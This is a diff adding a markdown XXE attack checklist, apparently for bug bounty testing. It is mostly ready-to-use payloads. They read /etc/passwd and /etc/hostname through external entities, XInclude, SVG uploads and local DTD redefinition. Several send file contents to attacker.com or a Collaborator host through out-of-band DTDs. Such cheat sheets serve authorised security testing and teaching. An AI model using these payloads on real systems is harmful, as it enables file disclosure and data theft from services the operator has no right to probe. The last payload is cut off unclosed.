@@ -1,0 +1,130 @@
+# XML External Entity (XXE) Attack Checklist
+
+## Understanding XXE
+XXE attacks exploit XML parsers by injecting external entities, allowing file disclosure, SSRF, and RCE.
+
+### Basic XXE Payload
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+    <!ENTITY ext SYSTEM "file:///etc/hostname">
+]>
+<data>
+    <info>&ext;</info>
+</data>
+```
+
+- Verify your payload here: [XML Validator](https://www.xmlvalidation.com/index.php)
+- [ ] Identify XML in requests or responses and test for XXE
+- [ ] Test different [URI schemas](https://www.notion.so/Wordlists-16a89a4e4960805bb0c4fe6cf164a35f?pvs=21)
+- [ ] Look for SSRF with Burp Collaborator
+- [ ] Test for internal file access or cloud metadata
+- [ ] Use [XXE payloads](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md)
+
+## Attack Surface for XXE
+- **Normal HTTP traffic**
+- **SOAP and REST APIs**
+  ```xml
+  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header/>
+    <soapenv:Body>
+      <GetFile>
+        <path>
+          <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+          <test>&xxe;</test>
+        </path>
+      </GetFile>
+    </soapenv:Body>
+  </soapenv:Envelope>
+  ```
+- **XInclude Bypass (if DOCTYPE is restricted)**
+  ```xml
+  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+  </foo>
+  ```
+- **File Upload (DOCX, SVG)**
+  - SVG-based XXE
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE svg [
+      <!ENTITY xxe SYSTEM "file:///etc/hostname">
+    ]>
+    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+      <text x="10" y="20">&xxe;</text>
+    </svg>
+    ```
+  - Out-of-band data exfiltration via SVG
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE svg [
+      <!ENTITY % xxe SYSTEM "file:///etc/hostname">
+      <!ENTITY % exfiltrate "<!ENTITY send SYSTEM 'http://attacker.com/?data=%xxe;'>">
+      %exfiltrate;
+    ]>
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <text x="10" y="20">&send;</text>
+    </svg>
+    ```
+
+## Blind XXE
+### Exploitation Techniques
+- **Out-of-band interaction via DTD**
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com"> %xxe; ]>
+  ```
+- **Data Exfiltration via External Request**
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "file:///etc/hostname">
+    <!ENTITY blind SYSTEM "https://attacker.com/?%xxe;">
+  ]>
+  <foo>&blind;</foo>
+  ```
+- **If external entities are restricted, use internal DTDs**
+  ```xml
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://burpcollaborator.net/?x=%file;'>">
+  %eval;
+  %exfil;
+  ```
+- **Inject external DTD for restricted environments**
+  ```xml
+  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://myserver/file.dtd"> %xxe;]>
+  ```
+  - Host `file.dtd` on your server:
+    ```xml
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+    %eval;
+    %exfil;
+    ```
+
+## XXE via Error Messages
+- **Use error-based data leakage**
+  ```xml
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+  ```
+
+## Local DTD Redefinition
+- If external DTDs are blocked, redefine local ones.
+- **Find local DTD paths:**
+  - `/usr/share/yelp/dtd/docbookx.dtd`
+  - `/usr/share/xml/schema/dtd/docbook.dtd`
+- **Redefine entities in local DTDs**
+  ```xml
+  <!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+  <!ENTITY % custom_entity '
+  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  &#x25;eval;
+  &#x25;error;
+  '>
+  %local_dtd;
+  ]>
+  
